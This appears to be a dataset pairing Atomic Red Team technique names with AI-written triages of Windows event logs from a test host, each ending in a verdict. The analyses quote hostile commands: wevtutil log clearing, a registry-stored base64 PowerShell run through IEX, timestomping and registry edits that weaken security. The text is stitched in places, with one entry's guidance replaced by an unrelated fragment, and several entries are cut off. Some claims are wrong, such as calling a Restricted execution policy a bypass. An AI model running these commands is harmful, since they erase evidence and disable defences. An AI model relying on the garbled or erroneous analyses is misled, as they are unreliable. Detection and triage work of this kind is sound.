   - **Security Log (Event ID 4616)**: Time changes recorded in the logs, while not uncommon, can indicate an attempt to manipulate timestamps to confuse log times or trigger events. These changes might be benign if correlated with legitimate system actions, but coupled with other suspicious activity, it becomes suspect.

5. **Reconnaissance Commands**:
   - **Sysmon Log (Event ID 1)**: There are executions of basic reconnaissance commands like `whoami.exe` and `hostname.exe`. While these can be legitimate, in the context of the other findings, they suggest potential preliminary assessment by an attacker or script on the system.

### Conclusion:
The compilation of activities indicates a high likelihood of malicious intent:
- The clearing of logs is a red flag as it suggests an attempt to hide unauthorized actions or access.
- The UAC registry modification suggests an effort to gain or maintain elevated privileges without triggering prompts.
- Multiple system-level processes executed under the high integrity level by a non-system user.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Investigation**: Escalate to a full security incident investigation. Collect memory and system images for forensic analysis.
2. **User Account Review**: Evaluate the activities and privileges of the ""admin_test"" account. Ensure no unauthorized user modifications.
3. **Network Isolation**: Temporarily isolate the affected system from the network to prevent further potential malicious activity or exfiltration.
4. **Audit and Monitor**: Increase monitoring on the network, especially regarding access logins and command executions from administrative users.
5. **Patch and Remediate**: Verify system integrity, apply all relevant security patches, and re-enable UAC settings. Conduct a full sweep for any unauthorized scripts or tools installed on the system.

By taking these steps, we can contain the threat, mitigate risk, and prevent further escalation or data loss."
UACME Bypass Method 61,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **Clearing of Logs**: From the System log, events with EventID 104 indicate that logs for both the System and Windows PowerShell channels have been cleared by a user named ""admin_test."" In the Security log, EventID 1102 signifies the security event log was cleared by the same user. Log clearing is often indicative of an attempt to hide tracks after malicious actions.

2. **Suspicious Command Execution**: In the Sysmon logs, an instance of `cmd.exe` executing with the command line `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe` is particularly suspicious. ""AtomicRedTeam"" is known for simulating red team activities, and ""uacme"" is a tool used to bypass User Account Control (UAC), which can be used for privilege escalation. 

3. **Wevtutil Usage**: 
   - Multiple instances of `wevtutil.exe` are noted (Sysmon log, EventID 1) being used by the user ""admin_test"" to clear various event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`). This correlates with the log clearing events mentioned above and supports the hypothesis of malicious intent to remove traces.

4. **Processes with High Integrity Levels**: Several high-integrity level processes (indicated by execution in the System/Login session) associated with account ""admin_test"" are observed performing tasks that align with red team testing or potential malicious activity, such as executing known Windows administrative tools and processes.

5. **Unusual Parent-Child Relationships**: Processes such as `cmd.exe` and `powershell.exe` are involved in executing or orchestrating actions likely leading to evasion or compromise (e.g., launching tools from the Temp directory).

Given these observations, it appears highly probable that these activities exhibit signs of a potential security compromise. The pattern suggests the execution of potentially unauthorized or harmful tools and attempts to obfuscate activities by clearing logs.

### Conclusion:

- **Resolution**: **MALICIOUS**
- **Recommendation**:
  1. Immediate investigation to identify all associated systems and isolate suspect systems.
  2. Review and audit user accounts, particularly ""admin_test,"" for unauthorized access or privilege misuse.
  3. Re-examine any access changes or installations around the event times.
  4. Enhance monitoring for similar activities and ensure strict logging policies are in place.
  5. Consider deploying further endpoint detection mechanisms or conducting a detailed forensic analysis to understand the breach's scope."
Execute base64-encoded PowerShell from Windows Registry,"Upon analyzing the provided logs, I have identified several indicators of potentially malicious activity. Here is the detailed analysis:

1. **PowerShell Logs:**
   - The PowerShell logs contain a series of commands executed by `powershell.exe`. These involve the use of `Set-ItemProperty` to set a registry value with a base64 encoded command, which is later executed using `Invoke-Expression (IEX)`. This pattern of behavior is suspicious and commonly used in malware to execute obfuscated and potentially harmful commands.
   - Specific command: `powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))""`. This suggests that a potentially malicious script is stored in the registry and being executed in an obfuscated manner.

2. **Sysmon Logs:**
   - The execution of `wevtutil.exe` to clear logs (`wevtutil.exe cl <logChannel>`) is noted for channels like `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. The clearing of event logs is a common technique used by attackers to cover traces of their activities.
   - Several instances of `whoami.exe` and `hostname.exe` are observed, which by themselves can be normal but in the context of other suspicious activity, they may indicate an attempt to gather information about the system.
   - The use of administrative processes like `wsmprovhost.exe` suggests high privilege usage, aligning with potential malicious actions.

3. **Security Logs:**
   - Event ID 1102 indicates that the security event log has been cleared by the user `admin_test`. This is another indicator of malicious activity as it is typically an effort to remove traces of an attack or unauthorized actions.

4. **General Context:**
   - The Windows Defender status remains `On`, indicating active security measures, though they have not prevented the noted suspicious activity.
   - High privilege tokens (Event ID 4672) with multiple sensitive privileges like `SeDebugPrivilege` were assigned to system processes, which could be leveraged in malicious activities.

**Assessment:**
- The combined evidence of registry manipulation using PowerShell, execution of encoded and obfuscated commands, and the clearing of critical event logs strongly indicate potentially malicious behavior.
- User `admin_test` seems to be involved in these activities, which raises further concerns about the account's integrity or potential compromise.

**Threats/Risks Identified:**
- The execution of potentially harmful PowerShell scripts.
- Clearing of critical logs, which might indicate an attempt to avoid detection after unauthorised actions.
- Possible information gathering or enumeration on the system as a precursor to further actions.

**Guidance on How to Proceed:**
- Immediate containment of the affected system (Server002) is recommended to prevent further suspicious activities.
- A full malware scan should be conducted on the system.
- All administrative accounts, especially `admin_test`, should be reviewed for unauthorized access and passwords should be changed.
- Implement monitoring on PowerShell usage to detect and prevent execution of unauthorized scripts.
- Analyze the network traffic from this host to identify any command and control callbacks or data exfiltration.

**Resolution: MALICIOUS**
- Based on the logs provided, the activities identified are consistent with malicious behavior. Immediate action is required to mitigate possible threats or ongoing compromises."
Bypass UAC using Event Viewer (PowerShell),"After conducting a detailed analysis of the provided Windows event logs, several activities indicate a potential compromise. Here are the key observations supporting this conclusion:

1. **Log Cleared Events**: The security and system logs highlight that logs were cleared (Event IDs: 1102 in Security Log and 104 in System Log). The user `SERVER002\admin_test` is associated with these log clearance events. This is a known tactic used by malicious actors to cover their tracks.

2. **Execution of `wevtutil.exe`**: This utility is used for querying and managing event logs, but its usage by `admin_test` in conjunction with clearing logs suggests the intent to hide activities, particularly since multiple instances of `wevtutil.exe` are logged executing various commands regarding log channels (e.g., Sysmon, Application).

3. **Suspicious PowerShell Execution**: The logs show a PowerShell execution with command lines designed to modify the registry and launch the Windows event viewer (`eventvwr.msc`). The command replaces the default handler in the registry for `.msc` files with `cmd.exe`, a known technique for privilege escalation since this can lead to command execution with higher privileges when triggered via event triggers.

4. **Backdoor/Privilege Escalation Indication**: The PowerShell command suggests possible privilege escalation attempts. Replacement of registry settings to run unexpected commands (`cmd.exe` in this context) indicates manipulation for persistence or privilege escalation. Such behavior is highly indicative of malicious intent.

5. **Time Discrepancies**: There is evidence of time adjustments (Event ID: 4616), possibly to tamper with timestamps, making forensic analysis more difficult.

Given the combination of these suspicious behaviors and tactics often associated with compromising activities (e.g., log clearance, suspicious use of PowerShell, registry modifications for potential persistence or escalation), it is highly probable that this activity is malicious.

**Assessment Conclusion: MALICIOUS**

**Guidance on How to Proceed**:

- Immediately conduct a comprehensive incident response investigation on the affected system (Server002). 
- Isolate the machine from the network to prevent further potential adversarial movement.
- Examine and verify which accounts have been compromised, especially focusing on `admin_test`.
- Capture memory and disk images for a deeper forensic analysis and to identify additional artifacts of compromise that may not be visible in the event logs.
- Review and tighten IAM policies and ensure all credentials are rotated, and unnecessary privileges are revoked.
- Conduct a broader audit to detect similar activities across the network.
- Update and review security policies and monitoring to detect and prevent similar future activities.
- Consider involving legal and appropriate authorities if applicable, as the CEO's machine was targeted and this could constitute a serious breach."
Mshta used to Execute PowerShell,"Based on an analysis of the provided Windows event logs, several activities raise serious concerns related to potential malicious behavior:

1. **Event Log Clearing**:
   - Multiple instances of the `wevtutil.exe` command are seen clearing event logs such as the Application, System, and Security logs. This behavior is often associated with attempts to cover tracks by malicious actors. The command `wevtutil.exe cl` is used, which clears the specified log (""Application"", ""System"", and ""Security"" logs in this case).

2. **Execution of Obfuscated Commands**:
   - The logs show command-line execution via `cmd.exe` that runs a heavily obfuscated command through `mshta.exe`. The command constructs and executes PowerShell using the `Wscript.Shell` COM object and includes the `-nop` (no profile) flag, which is commonly used to bypass security restrictions. 
   - The use of mshta.exe with VBScript to run PowerShell commands is a known technique for executing malicious code, often associated with fileless malware attacks.

3. **Suspicious Process Activity**:
   - Sequential execution of `hostname.exe` and `whoami.exe`, these processes are typically used for reconnaissance within a network. 
   - Running these commands in conjunction with the aforementioned obfuscation and log clearing indicates an attempt to gather information on the current environment and user context, possibly in preparation for further malicious actions.

4. **Time Manipulation**:
   - Changes to the system time or irregular adjustments, as seen with `EventID 4616`, could be indicative of attempts to disrupt or confuse logging processes or to defeat time-based security mechanisms.

Given these observations, while a few isolated activities might be benign or related to legitimate administrative tasks on a server, the combination of log clearing, use of obfuscated scripts, and suspicious process execution strongly suggests malicious intent.

**Assessment**: 
The analyzed activities within the logs strongly indicate a compromise, suggesting unauthorized and potentially harmful behavior.

**Resolution**: MALICIOUS
- **Immediate Guidance**:
  - Isolate the affected system (Server002) from the network to prevent further potential spread or exfiltration of sensitive information.
  - Conduct a thorough forensic investigation to trace the origin and extent of the compromise.
  - Review and validate user permissions, ensuring least privilege.
  - Enhance logging and monitoring capabilities to detect similar activities in the future.
  - Consider reimaging the compromised system to restore it to a secure state.

This is a high-priority security incident, and the provided resolution is aimed at mitigating further risks and understanding the full scope of the intrusion."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"Upon reviewing the provided event logs from the Windows host (Server002), there is a pattern of behavior that stands out and points toward a potential compromise or at least suspicious activity:

1. **Log Clearing Events:**
   - There are multiple instances where the `wevtutil` command-line utility is being used to clear various logs (`Sysmon`, `Application`, `System`, and `Security` logs). This is done by the user `SERVER002\\admin_test` with high integrity levels.
   - Event 1102 in the Security log indicates that the Security log was cleared, and Sysmon logs show multiple sessions of `wevtutil.exe` with commands clearly designed to clear logs.

2. **PowerShell and Other Unusual Command Executions:**
   - There is a suspicious PowerShell activity initiating with an execution policy bypass (`-ExecutionPolicy Restricted`), which is uncharacteristic and potentially indicative of trying to evade detection by reducing limitations.
   - Anomalous use of PowerShell is recorded, specifically with operations like `Invoke-ATHHTMLApplication` and `SimulateLateralMovement` which are not typical for standard administrative tasks.

3. **Use of PowerShell Scripts and Lateral Movement Techniques:**
   - The PowerShell command involves `Invoke-ATHHTMLApplication` and MSHTA with a local UNC path, which can be legitimately used for administrative purpose, but also can be abused for malicious purposes like executing an HTA file for lateral movement or initial access payloads.

4. **Host and User Enumeration:**
   - Execution of commands like `whoami.exe` and `hostname.exe` which may not be outright malicious by themselves but could be part of reconnaissance attempts by an attacker to learn more about the environment.

5. **Suspicious Timing of Events:**
   - The sequence of events appears to be highly orchestrated with short intervals between suspicious activity, potentially indicating scripted or automated tasks conducted for malicious intent.

Given these observations, there is strong evidence to conclude that the activities recorded in these logs are indeed actions of potential compromise, involving log clearing, PowerShell misuse with possible lateral movement script invocations, and indicators of malicious operational procedures (e.g., clearing event logs to cover tracks).

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - Isolate Server002 to prevent potential lateral movement and further compromise across the network.

2. **Incident Response:**
   - Initiate a full forensic investigation on Server002 to gather disk images and memory dumps for in-depth analysis.

3. **Review and Secure Accounts:**
   - Review and monitor user accounts (`admin_test`) activity and consider resetting credentials. Look for any unauthorized addition of new accounts or privilege escalations.

4. **Enhance Monitoring:**
   - Increase EDR and SIEM logging around PowerShell usage, command-line executions, and unauthorized use of system utilities like `wevtutil`.

5. **Patch and Update:**
   - Ensure all systems, including Server002, are fully patched and updated to mitigate known vulnerabilities, especially focusing on the PowerShell and security logging configurations.

6. **Awareness and Training:**
   - Conduct training sessions to raise awareness about the indicators of compromise related to such tactics and how to spot them.

Compiled HTML Help Local Payload,"Based on the analysis of the provided logs, several events indicate potentially malicious activity. Below is a detailed review of these logs:

### Indicators of Potential Malicious Activity:

1. **Event Log Clearing (Security and System Logs):**
   - **Security Event ID 1102:** Indicates that the security log was cleared by the user `admin_test`. This is a significant red flag as clearing event logs is often a tactic used to hide malicious activity.
   - **System Event ID 104:** The system and Windows PowerShell logs were cleared by `admin_test`. Log clearing, especially without legitimate maintenance purposes, is indicative of a potential attempt to erase traces of unauthorized activity.

2. **PowerShell and Wevtutil Executions:**
   - Commands executed using `wevtutil.exe` to clear logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`) indicate the deliberate removal of potentially incriminating evidence.
   - Execution of `powershell.exe` by `admin_test` without much detail on its activity, together with log clearing, suggests potential malicious scripting or command execution.

3. **Suspicious Command Executions via CMD:**
   - The execution of `cmd.exe` using `hh.exe` (HTML Help Executable), often related to LOLBAS (Living-Off-The-Land Binaries and Scripts) techniques to execute arbitrary code.

4. **Privileged Access and Logons:**
   - Multiple instances where the `admin_test` account, along with SYSTEM level privileges, executed commands with high integrity. Privileges like SeDebugPrivilege and SeLoadDriverPrivilege are often exploited for escalation or malicious intent.
   - Event ID 4672 and 4624 with references to high privileges and SYSTEM user logon indicate elevated operations. While these can be potentially benign, in context with other findings, they become more suspect.

5. **Abnormal Usage of Tools**:
   - Abnormal use of legitimate Windows tools like `wevtutil.exe` and `wsmprovhost.exe`, in combination with Sysmon records, is concerning. The tool usage appears systematically tied to log clearing actions.

### Assessment and Conclusion:

The sequence of actions logged, both from system tool usage and direct access with elevated privileges, align with activities commonly seen in covert threat actions. Specifically, the clearing of logs, conjunction with high privilege usage, and execution of PowerShell and cmd commands suggest attempts to obscure activity on the system.

### Resolution:

- **MALICIOUS**

### Recommendation for Proceeding:

1. **Immediate Isolation:** Immediately isolate the affected system (Server002) from the network to prevent further compromise.
   
2. **Forensic Duplication:** Create a forensic copy of the system for thorough examination and to preserve evidence.

3. **Incident Response Engagement:** Engage with an Incident Response team to investigate possible lateral movements and persistence methods employed by bad actors.

5. **Root Cause Analysis and Patching:** Identify vulnerabilities exploited and apply necessary security patches and ensure system configurations that prevent recurrence.

6. **Post-Incident Monitoring:** Increase monitoring on other critical assets for similar patterns of activity as a precautionary measure."
Windows - Modify file creation timestamp with PowerShell,"**Detailed Analysis of the Logs:**

- **Unusual PowerShell Activity:**
  - The PowerShell command observed in the logs is related to changing file timestamps (timestomping). The command `Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1551.006_timestomp.txt"" | % { $_.CreationTime = ""01/01/1970 00:00:00"" }` is a known technique to alter file timestamps, which is typically used to cover tracks in malicious activities. The reference to AtomicRedTeam suggests this might be part of a Red Team exercise, which indicates a simulated malicious activity rather than a real threat. However, if not authorized, this represents a significant security risk.

- **Event Logs Cleared:**
  - Multiple instances of the `wevtutil.exe` utility being executed with the `cl` (clear) command to clear various event logs (`Sysmon/Operational`, `Application`, `System`, and `Security`) by the `admin_test` user are present. Clearing event logs is highly suspicious and is a common technique used by attackers to remove traces of their activities.

- **Kernel Time Manipulation:**
  - The system log displays events where the system time was altered. Altering timestamps can be an indicator of attempts to modify forensic evidence or confuse time-based logging. This operation can be legal in some legitimate scenarios but raises a red flag when combined with other suspicious activities.

- **Microsoft Edge Update Activity:**
  - The logs contain many events related to the Microsoft Edge Update process. These appear to be routine update operations executed by a legitimate service running under the NT AUTHORITY\SYSTEM account.

**Assessment:**

The combination of PowerShell usage to potentially modify timestamps surreptitiously, multiple occurrences of event log clearing, and system time manipulation suggests a coordinated attempt to cover tracks on the system, indicating potentially unauthorized and fraudulent activity. 

Although the presence of AtomicRedTeam methodologies suggests the possibility of a sanctioned Red Team exercise or security test, without explicit confirmation or known scheduled activities, these activities are highly suspicious and necessitate further investigation.

**Threats and Risks Identified:**

- **Log Clearing Activities:** Can result in loss of critical forensic evidence and hinder investigative efforts in case of a real incident.
- **Timestomping and System Time Changes:** May be indicative of deception tactics used by an attacker to mislead incident response teams.
- **Potential Unauthorized Access:** If these actions were not pre-approved or documented as part of a scheduled security test, they could indicate malicious insider activity or external compromise.

**Guidance on How to Proceed:**

1. **Verify Authorization:** Verify if these actions relate to any authorized Red Team exercise or penetration test conducted on this host on the specified date.
2. **Incident Response:** If these actions were not authorized, initiate an incident response process immediately to contain any potential breach and gather as much evidence as possible from remaining logs and endpoints.
3. **Audit Log Management Practices:** Review and enhance log management practices to ensure critical logs are not routinely cleared without proper authorization and are retained as per the organization’s policy.
4. **Conduct Forensic Review:** Collect data from the system for a detailed forensic review to understand the full scope of the activities and potential impacts.

**Resolution:**
- **SUSPICIOUS** - The combination of activities observed (clearing logs, changing system times, and potential use of PowerShell for malicious purposes) necessitates further investigation to determine intent and authorization."
Odbcconf.exe - Load Response File,"Upon analyzing the provided log entries, several points of interest suggesting suspicious activities have been identified. The following analysis provides insights into these activities:

1. **Clearing of Event Logs**:
   - There are multiple occurrences of the `wevtutil.exe` command line utility being used to clear logs, as indicated by events in both the Security and Sysmon logs:
     - Command `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`
     - Command `""C:\\Windows\\system32\\wevtutil.exe\"" cl System`
     - Command `""C:\\Windows\\system32\\wevtutil.exe\"" cl Windows PowerShell`
     - Command `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`
   - The clearing of event logs is usually an indicator of an attempt to hide potentially malicious activity. The identity performing these actions is `admin_test`, indicating possible misuse of an administrative account.

2. **Command Line Execution of `odbcconf.exe`**:
   - The command executed by `cmd.exe` has a payload involving `odbcconf.exe` which is run with the argument `-f ""T1218.008.rsp""`. This is a known lolbas (living-off-the-land binary) technique which could be used for defense evasion or persistence.

3. **Excessive Privilege Assignments**:
   - The event ID `4672`, with privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, popping up multiple times for the `admin_test` user indicates unusually high privilege levels being assigned. These privileges could allow for unauthorized manipulation of high-security systems and files.

4. **Multiple Edge Update Executions**:
   - High frequency of Microsoft Edge Installer activities is observed. While the legitimate update might appear as routine, attackers may attempt to blend their activities among normal operations. The various `setup.exe` and its derivatives might warrant further scrutiny to ensure these installer processes are legitimate and that no malicious payload is being disguised as an update.

Given the analysis above, the logs display several clear signs of malicious activity, particularly with log clearing events, the use of well-known LOLBAS techniques, and irregular user privilege assignments. These indicate attempts to cover tracks and potential unauthorized activities that could be part of a larger attack strategy like privilege escalation, lateral movement, or data exfiltration.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediately investigate the user account `admin_test` for signs of compromise, unauthorized usage, or any anomalies in activity logs.
- Verify the legitimacy of all Edge update processes to ensure they are genuine and prevent any mimicked or hijacked updates.
- Conduct a thorough security audit of the system to detect any unauthorized accesses, especially focusing on sensitive systems that might have been tampered with.
- Review and, if necessary, tighten security policies, such as limiting high privilege assignments and implementing stricter access controls to reduce attack vectors.
- Advise the IT department to apply further monitoring, especially focusing on newly created processes and the usage of critical system utilities like `wevtutil`."

Disable Defender Using NirSoft AdvancedRun,"**Analysis and Summary:**

The provided logs demonstrate several concerning activities that suggest possible malicious behavior, particularly on the host identified as ""Server002."" Below are the observations and analyses:

1. **Clearing of Event Logs:**
   - A crucial indication of malicious activities is the clearing of event logs (Event ID 1102 in the Security log and Event IDs 104 in the System log). The logs show that a user named ""admin_test"" executed `wevtutil.exe` to clear various event logs, including the Sysmon, System, and Security logs. Log clearing is often used to cover tracks after malicious actions have been performed.

2. **Execution of Suspicious Commands:**
   - The execution of `PowerShell.exe` with an unusual command-line, along with references to `AdvancedRun.exe` for executing `sc.exe` with elevated privileges, indicates an attempt to disable the Windows Defender service (`WinDefend`). This is a strong indicator of malicious intent, aiming to disable the system's defense mechanisms.
   - The PowerShell script also attempts to remove the Windows Defender directory using `rmdir`, indicating further malicious actions against system protection mechanisms.

3. **Use of `AdvancedRun.exe`:**
   - The use of `AdvancedRun.exe` to execute commands as different users with various privileges (including SYSTEM level) is unconventional for typical administrative tasks and suggests its use in bypassing user access controls to execute commands that would otherwise be restricted.

4. **Suspicious Edge Update Executions:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` with various command-line arguments under the NT AUTHORITY\SYSTEM account could either be a legitimate update process or potentially abused by malicious actors to execute malicious payloads. Further scrutiny of these processes is warranted to distinguish between legitimate and potential malware-injected actions.

5. **Additional Processes:**
   - Processes like `cmd.exe`, `wevtutil.exe`, and the presence of other utility executions, such as `HOSTNAME.EXE` and `whoami.exe`, when examined in the context of cleared logs and Powershell misuse, contribute to the pattern of potentially malicious behavior.

**Conclusion and Resolution:**

In light of the above observations and analyses, the activities outlined in the logs strongly indicate intentional acts to subvert the host's security mechanisms and conceal actions through log tampering. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

   - SYSmon logs show the use of ""cmd.exe"" with a command to modify the registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f`. This behavior is unusual during normal activities and points towards a configuration change that typically requires administrative privileges.

3. **Process Executions**:
   - Multiple executions of MicrosoftEdgeUpdate.exe and related processes with various command line arguments like `/update`, `/regsvc`, `/regserver`, etc. While Edge Update processes could run normally during system updates, the frequency and patterns indicate they might be misused or tampered with, possibly using a temporary directory for execution at one point.

4. **Time Change Events**:
   - There are security audit events indicating changes in system time (Event ID 4616). While minor time adjustments can be normal, if combined with other suspicious activities, it could be indicative of attempts to manipulate timestamps to hide malicious activities.

**Assessment and Conclusion**:
Given the multiple indicators of event log tampering, unusual command execution, and registry editing, there is a strong suspicion of malicious actions being performed on the system. The behavior doesn't match typical or benign operations and seems indicative of attempts to manipulate and hide unauthorized activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. Implement an immediate containment strategy by isolating the affected system (Server002) from the network to prevent further compromise or data exfiltration.
2. Conduct a thorough forensic analysis on the machine to identify and remove any malicious software or backdoors.
3. Change all credentials associated with the system and possibly the domain if lateral movement is suspected.
4. Rebuild or clean restore the system from a known good backup, ensuring the environment is secure before reconnecting to the network.
5. Review and enhance security policies, particularly around log retention and monitoring to detect similar activities in the future."
Makes Eventlog blind with Phant0m,"Upon analyzing the provided Windows event logs, several indicators of suspicious activity stand out:

1. **Event Log Clearing (System and Security Logs):**
   - Multiple events indicate the clearing of Windows Event Logs, specifically system, security, and PowerShell channels, using the `wevtutil.exe` utility. This is a strong indicator of potentially malicious activity, as attackers often clear logs to cover their tracks. Notably, these actions were conducted by the user `SERVER002\admin_test`.
   
2. **Process Execution with Elevated Privileges:**
   - There are several `ProcessCreate` and `ProcessTerminate` events associated with `wevtutil.exe`, a tool for managing Windows Event Logs, indicating its execution with elevated privileges by the same user, `admin_test`.
   - Additionally, an instance of `Phant0m.exe` was executed from the `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1562.002\bin\` directory via `cmd.exe`. The `Phant0m` tool is known to stop Windows logging services, which aligns with malicious log-clearing activity.

3. **Consistency Across Logs:**
   - The logs provided across various channels (System, Sysmon, Application, and Security) consistently show patterns of behavior associated with attempts to hide activities, like clearing logs and executing suspicious tools.

4. **Atomic Red Team Activity:**

Disable Windows Auto Reboot for current logon user,"Upon reviewing the provided Windows event logs from Server002, here is the analysis:

### Key Findings:
1. **Log File Clearing:**
   - The system log shows several instances of event ID 104, indicating that logs were cleared by the user ""admin_test"" across multiple channels, including System and Windows PowerShell. This is typically suspicious behavior, as clearing logs can be an attempt to hide malicious activity.
   - The security log corroborates this with event ID 1102 (log cleared) for the Security channel by the same user.

2. **Use of `wevtutil.exe`:**
   - The Sysmon logs frequently note the use of `wevtutil.exe`, the Windows Event Command Line Utility, by the user ""admin_test"" for clearing logs. This supports the log clearing events found in the system and security logs.

3. **Potential Unauthorized Registry Edit:**
   - There is a suspicious execution of `cmd.exe` followed by `reg.exe`, which attempts to modify the Windows registry key to disable auto-reboot with logged-on users. This is potentially concerning as it could be used to prevent system updates or restarts intended to remove malware.
   - The command executed is: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 1 /f`.

4. **Time Change Events:**
   - Events ID 4616 in the Security log and correlating Kernel-General events show the system time being manipulated. Time changes, especially frequent ones, can be suspicious if not performed for legitimate reasons (typically scheduled maintenance).

5. **Microsoft Edge Update Activity:**
   - There is significant activity related to Microsoft Edge Update processes, which under normal circumstances can appear benign. However, in the context of other suspicious activities, it warrants further investigation to ensure these updates are legitimate and not being leveraged as a means for persistence or further compromise.

6. **Unusual Conhost.exe Activities:**
   - The logs show multiple `conhost.exe` processes being created under high integrity in association with command-line utility executions. This could coincide with concealed activities if scripts or commands executed within these sessions are malicious.

### Assessment:
The combination of log clearing, unauthorized registry edits, suspicious command-line executions, and time changes suggests potentially malicious activity. The user ""admin_test"" appears to be either compromised or actively involved in these tasks that are typically associated with efforts to cover tracks and maintain persistence on the system.

### Resolution:
- **MALICIOUS**: The log activity strongly indicates deliberate log tampering, unauthorized system changes, and attempts to obscure or persist malicious activities.

### Guidance on How to Proceed:
1. **Immediate Response:**

Execution from Compressed File,"## Detailed Analysis

### Key Observations

1. **Event Log Clearing:**
   - The `wevtutil.exe` utility is observed clearing logs (`Sysmon`, `Application`, `System`, `Security`, `Windows PowerShell`). This activity is suspicious due to its alignment with known tactics to cover tracks after malicious activity.
   - User `SERVER002\admin_test` is performing these actions. The log clearance aligns with EventID 1102 and 104, which confirms log clearing sequence in both Security and System channels respectively.

2. **Suspicious Executions:**
   - The process `T1027.exe`, typically associated with tactics to obfuscate binaries sometimes used in Red Team exercises or actual attacks, was executed. It was found in a path linked to ""AtomicRedTeam"", a known Red Team framework, which suggests this might have been an operation by internal testing or potential misuse.
   - The suspicious execution of `whoami.exe` and `HOSTNAME.EXE` may be benign utilities used in an unconventional manner, potentially indicating a check of logged-in users and hostname information post-compromise.

3. **Microsoft Edge Update:**
   - Legitimate system-level updates are performed by `MicrosoftEdgeUpdate.exe` and its child processes. It doesn't show signs of aberrant behavior given the context and service-level execution.

4. **Windows Update:**
   - Normal update processes related to Windows Defender Antivirus updates (`AM_Delta.exe` and `MpSigStub.exe`) are noted. These processes are system-authorized and carry out legitimate antivirus signature updates.

### Indicators of Malicious Activity

- **Log Deletion:** The clearing of Windows Event Logs by an administrative user is a strong indicator of malicious intent, often used to hide traces of unauthorized access or changes.
- **Execution of Suspicious Software**: The execution of `T1027.exe` in a TEMP directory and its subsequent spawning of the Windows calculator (`calc.exe`) without visible purpose raises suspicion of a test or misuse with impact outside a controlled environment.

### Threats or Risks

- The actions of log clearing and execution of binary found in a Red Team framework directory imply either an unauthorized test or a potential malicious activity using legit security testing tools.
- Anomalies detected have an inherent risk of either internal misuse of security tools or an actual compromise masked with obfuscation methods common to penetration testing.

- Although no harm was directly evidenced in the logs, the behaviors are characteristic of a system that has been accessed and manipulated with unauthorized administrative credentials.

### Guidance on How to Proceed:

- Conduct a full forensic investigation on the CEO's system to establish a timeline of the events leading up to and following these activities.
- Isolate the machine from the network to prevent further potential damage or data exfiltration.
- Review the logs for any external connections that might indicate data transfer or command-and-control communication.
- Change all administrative credentials, particularly those associated with the account `admin_test`.
- Conduct a comprehensive malware scan and integrity check of the system files to identify any tampered files or malicious software.
- Reassess and strengthen logging policies to prevent unauthorized clearing and ensure effective incident tracking in the future.

### Resolution:

- **MALICIOUS** - The logs indicate behavior consistent with malicious activity, warranting an immediate response to mitigate potential damage and secure the affected systems."
Disable Remote Desktop Security Settings Through Registry,"Based on the analysis of the provided logs, several indicators suggest suspicious and potentially malicious activities on the Windows host ""Server002."" Let's break down the notable events:

1. **Event Log Clearing Attempts**:
   - The logs indicate multiple attempts to clear event logs using ""wevtutil.exe"" (Event IDs 1102 and 104). This type of activity is a well-known indicator of malicious behavior as attackers often clear logs to cover their tracks. These actions were performed by the user ""admin_test"" on different channels including Security, System, and Windows PowerShell logs.

2. **Use of Administrative Privileges**:
   - There is a privilege escalation event (Event ID 4672), where the user ""admin_test"" gained sensitive privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This is unusual for routine administrative tasks and suggests an attempt to perform system-level operations, which may indicate malicious intent.

3. **Suspicious Process Executions**:
   - Multiple processes such as ""wevtutil.exe"" and ""cmd.exe"" were executed from the user's document directory with high integrity level, indicating administrative rights. Among these, a command was executed to modify the system registry to disable security settings (seen in the execution of ""cmd.exe"" and ""reg.exe""). This behavior is particularly concerning as it represents an attempt to weaken security configurations.

4. **Time Manipulation**:
   - The security log shows changes in the system time (Event ID 4616). Time manipulation is often used to confuse forensic investigations or facilitate other attacks.

5. **Network Connectivity and Remote Activity**:
   - The logon events (Event ID 4624) using ""Logon Type 3"" indicate network-based access, potentially from external sources (""IpAddress"": ""192.168.0.102""). 

Considering these activities:
- The clearing of event logs, privilege escalation, and registry changes are concerning and align with TTPs (Tactics, Techniques, and Procedures) of advanced threat actors.
- The use of ""wevtutil.exe"" and other command-line executions to obfuscate actions further points towards attempts to hide malicious activity.

**Resolution: MALICIOUS** - The collected evidence and analysis strongly indicate malicious intent and potential compromise on the system ""Server002."" Immediate actions should be taken to isolate the system from the network, perform a deeper forensic analysis, and potentially reimage the affected system. Additionally, it's essential to review user permissions and update security configurations to prevent similar incidents in the future."
WINWORD Remote Template Injection,"### Analysis of Logs

**Suspicious and Anomalous Behavior:**

1. **Log Clearing Events:**
   - There are events in the Security and System logs indicating that logs were cleared:
     - Security log cleared by the user `admin_test` (Security Event ID 1102).
     - System log cleared by the user `admin_test` (System Event ID 104).
